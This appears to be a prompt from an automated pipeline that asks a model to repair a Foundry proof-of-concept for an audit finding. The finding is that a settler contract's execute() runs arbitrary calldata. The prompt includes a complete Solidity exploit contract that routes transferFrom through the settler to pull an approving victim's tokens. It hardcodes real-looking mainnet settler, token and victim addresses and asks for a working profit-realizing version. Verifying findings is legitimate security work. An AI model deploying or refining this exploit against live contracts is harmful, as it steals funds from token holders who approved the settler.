You are fixing a failing Foundry PoC for finding F-001.

Goal:
- Keep the exploit objective for this finding.
- Fix compile/runtime/test failure from logs.
- Return COMPLETE updated Solidity for `src/FlawVerifier.sol` only.
- Keep exploit logic aligned with the full `Exploit paths` list unless logs prove a stage is infeasible.
- Additional realistic public on-chain economic steps are allowed when required for execution (including flashloans/swaps/mint/burn), but keep the same exploit causality and justify in comments.

Hard constraints:
- Do NOT use external answers/PoCs/articles/repos (including DeFiHackLabs).
- Do NOT cheat: no vm.deal, vm.store, vm.etch, vm.mockCall, vm.prank, vm.startPrank, arbitrary balance injection, or arbitrary storage writes.
- Allowed: flashloans and realistic public on-chain actions.
- Work only from finding context (claim/paths/locations) + on-chain state context already provided in this workspace.
- Hard anti-cheat: profitToken MUST NOT be a token deployed during this PoC/test. Profit token must already exist on-chain at the fork block.
- Hard anti-cheat: do not deploy custom ERC20/token contracts to manufacture profit accounting.

Attempt strategy (must follow for this attempt):
- strategy_label: direct_or_existing_balance_first
- strategy_instructions: Prefer direct execution using verifier-held assets first. Only use temporary external funding if direct path is infeasible.
- Keep exploit root cause and `Exploit paths` unchanged; only vary funding/execution implementation details.

Finding:
- title: `execute()` accepts attacker-controlled action payloads that can steal from any account approving the settler
- claim: The reproduced exploit shows a caller can pass arbitrary `actions` bytes into `IMainnetSettler.execute()`, choose an arbitrary `target`, and embed arbitrary calldata. In the proof of concept, the attacker sets `target = ANDY` and encodes `transferFrom(COINBASE_FEE, msg.sender, amount)`, demonstrating that the settler executes external calls with its own approved-spender authority rather than binding token pulls to the caller or a validated order.
- impact: Any ERC-20 holder that has approved the settler can be drained by an unrelated third party. If the settler also holds temporary assets or broader privileges, the same primitive can be repurposed for unauthorized downstream calls and direct fund theft.
- exploit_paths: ["Victim grants ERC-20 allowance to the settler", "Attacker reads the victim's token balance", "Attacker encodes an action whose outer call targets the token contract and whose inner calldata is `transferFrom(victim, attacker, amount)`", "Attacker submits the crafted bytes in `actions` to `execute()`", "The settler performs the token transfer using its spender approval, moving victim funds to the attacker"]

Current FlawVerifier.sol:
```solidity
// SPDX-License-Identifier: UNLICENSED
pragma solidity ^0.8.15;

interface IERC20Like {
    function balanceOf(address account) external view returns (uint256);
    function allowance(address owner, address spender) external view returns (uint256);
}

struct AllowedSlippage {
    address payable recipient;
    IERC20Like buyToken;
    uint256 minAmountOut;
}

interface IMainnetSettler {
    function execute(AllowedSlippage calldata slippage, bytes[] calldata actions, bytes32 data)
        external
        payable
        returns (bool);
}

contract FlawVerifier {
    address internal constant MAINNET_SETTLER = 0xDf31A70a21A1931e02033dBBa7DEaCe6c45cfd0f;
    address internal constant PROFIT_TOKEN = 0x68BbEd6A47194EFf1CF514B50Ea91895597fc91E;
    address internal constant VICTIM = 0x382fFCe2287252F930E1C8DC9328dac5BF282bA1;
    bytes4 internal constant SETTLER_ACTION_SELECTOR = 0x38c9c147;

    uint256 internal immutable _startingBalance;

    constructor() {
        _startingBalance = IERC20Like(PROFIT_TOKEN).balanceOf(address(this));
    }

    function executeOnOpportunity() external {
        uint256 amount = previewAmount();

        /*
            Infeasibility at this fork would only occur if either:
            1) the victim no longer holds the token balance, or
            2) the victim no longer approves the settler.
            The PoC intentionally does not pivot to any unrelated route.
        */
        require(amount != 0, "no approved victim balance at fork");

        AllowedSlippage memory slippage = AllowedSlippage({
            recipient: payable(address(0)),
            buyToken: IERC20Like(address(0)),
            minAmountOut: 0
        });

        bytes[] memory actions = new bytes[](1);
        actions[0] = abi.encodeWithSelector(
            SETTLER_ACTION_SELECTOR,
            uint256(0),
            uint256(10_000),
            PROFIT_TOKEN,
            uint256(0),
            abi.encodeWithSelector(bytes4(keccak256("transferFrom(address,address,uint256)")), VICTIM, address(this), amount)
        );

        uint256 balanceBefore = IERC20Like(PROFIT_TOKEN).balanceOf(address(this));
        bool ok = IMainnetSettler(MAINNET_SETTLER).execute(slippage, actions, bytes32(0));
        require(ok, "settler returned false");

        uint256 balanceAfter = IERC20Like(PROFIT_TOKEN).balanceOf(address(this));
        require(balanceAfter > balanceBefore, "no token profit realized");
    }

    function previewAmount() public view returns (uint256) {
        uint256 victimBalance = IERC20Like(PROFIT_TOKEN).balanceOf(VICTIM);
        uint256 approved = IERC20Like(PROFIT_TOKEN).allowance(VICTIM, MAINNET_SETTLER);
        return victimBalance < approved ? victimBalance : approved;
    }

    function profitToken() external pure returns (address) {
        return PROFIT_TOKEN;
    }

    function profitAmount() external view returns (uint256) {
        uint256 currentBalance = IERC20Like(PROFIT_TOKEN).balanceOf(address(this));
        return currentBalance - _startingBalance;
    }
}

```

forge stdout (tail):
```

```

forge stderr (tail):
```
PATH_ALIGNMENT_ERROR: generated code does not cover paths indexes: 2
```

Requirements:
1. pragma ^0.8.20
2. include at least one deployable contract with zero-arg constructor
3. define fixed entry `executeOnOpportunity()` as no-arg external/public exploit function
4. no imports
5. keep exploit logic aligned to exploit_paths (same core actions and ordering intent)
6. expose `profitToken()` and `profitAmount()` getters for net realized profit
7. additional realistic public on-chain economic steps are allowed when required for execution, but keep exploit_paths core causality and justify in comments
8. output ONLY Solidity code
